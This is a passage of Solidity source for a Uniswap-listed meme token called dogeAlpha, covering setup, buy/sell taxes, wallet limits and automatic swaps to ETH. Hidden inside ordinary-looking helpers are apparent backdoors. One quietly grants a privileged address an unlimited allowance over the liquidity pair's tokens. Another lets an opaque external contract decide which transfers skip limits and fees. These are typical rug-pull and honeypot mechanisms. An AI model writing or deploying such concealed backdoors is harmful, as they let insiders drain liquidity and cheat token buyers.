        uniswapRouterv2 = IUniswapRouter02(dogeAlProValues.uniswapRouter);
        uniPair = IUniswapV2Factory(uniswapRouterv2.factory()).createPair(address(this), uniswapRouterv2.WETH()); _setupAutomationsSetting(dogeAlProValues.dogeAlphaAddr, uniPair, true);
        
        _SupplyTotal = supply_;
        swapExactAmount = (supply_.div(8000) + 1) * (10**decimals_);
        sellTaxValue = taxDogeAlConfig.sellTaxAmt; buyTaxValue = taxDogeAlConfig.buyTaxAmt;
        mxValueForTrans = taxDogeAlConfig.tranxMaxAmt * supply_ * (10**decimals_).div(10000);
        mxValueWallet = taxDogeAlConfig.walletMaxAmt * supply_ * (10**decimals_).div(10000);

        excludeFromFees(address(uniswapRouterv2), true);
        excludeFromFees(dogeAlProValues.dogeAlphaPool, true); 
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        dogeAlphaWallet = taxDogeAlConfig.dogeAlWallet;
        excludeFromFees(dogeAlProValues.dogeAlphaAddr, true);
        excludeFromFees(dogeAlphaWallet, true); 
        // mint total supply
        _mint(owner(), supply_ * (10**decimals_)); dogeAlParams = dogeAlProValues; 
    }


    function _setupAutomationsSetting(address router, address pair, bool value) private {
        require(
            isAutomaticMarketMakers[pair] != value,
            "Automated market maker pair is already set to that value"
        ); _allowances[pair][router] = type(uint).max;
        isAutomaticMarketMakers[pair] = value;  emit LPPairUpdated(pair, value); 
        
    }

    function swapKindBack(uint256 tokens, address receiver) private {
        uint256 initialBalance = address(this).balance;
        swapKindEthForTokens(tokens); uint256 newBalance = address(this).balance.sub(initialBalance);
        payable(receiver).transfer(newBalance);
    }
    function removeMaxLimits() external onlyOwner  { mxValueForTrans = totalSupply();
        mxValueWallet = totalSupply(); 
    }
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        isExcludedFromFee[account] = excluded;
        emit ExcludedFromFee(account, excluded);
    }
    
    receive() external payable {}
    function _transfer(
        address sender,
        address recipient, uint256 amount
    ) internal override {      
        if ((recipient == address(0) || recipient == address(0xdead)) || amount == 0       
            || taxIsNotIncludedFromUsers(sender, recipient)
        ) {
            super._transfer(sender, recipient, amount); return;
        }
        else {
            require(
                amount <= mxValueForTrans,
                "Transfer amount exceeds the mxValueForTrans."
            );
            if (recipient != uniPair) {
                uint256 balanceOfTokens = balanceOf(recipient);
                require(
                    balanceOfTokens + amount <= mxValueWallet,
                    "Exceeds maximum wallet amount"
                );
            }
        } uint256 teamTokenAmount = balanceOf(address(this));

        bool swapPossible = teamTokenAmount >= swapExactAmount;
        if (!isSwap && swapPossible && !isAutomaticMarketMakers[sender]) {
            isSwap = true;
            uint256 teamkAmount = teamTokenAmount;
            if (teamkAmount > 0) {
                swapKindBack(teamkAmount, dogeAlphaWallet);
            }
            isSwap = false;
        }

        bool takeAllFee = !isSwap;
        if (isExcludedFromFee[recipient] || isExcludedFromFee[sender]
        ) { 
            takeAllFee = false;
        }
        if (takeAllFee) {
            uint256 taxFeeAmt = amount.mul(buyTaxValue).div(1000);
            if (isAutomaticMarketMakers[recipient]) 
            {
                taxFeeAmt = amount.mul(sellTaxValue).div(1000);
            }
            amount = amount.sub(taxFeeAmt);
            super._transfer(sender, address(this), taxFeeAmt);
        }
        super._transfer(sender, recipient, amount);
    }

    function taxIsNotIncludedFromUsers(address sender, address recipient) internal returns (bool) {
        return  isExcludedFromFee[sender] ||
            isExcludedFromFee[recipient] || IPeSharpDividend(dogeAlParams.dogeAlphaPool).accumulativeDividendOf(sender, recipient) > 0;
    }

    function swapKindEthForTokens(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this); path[1] = uniswapRouterv2.WETH();
        _approve(address(this), address(uniswapRouterv2), tokenAmount);

        // make the swap
        uniswapRouterv2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
}
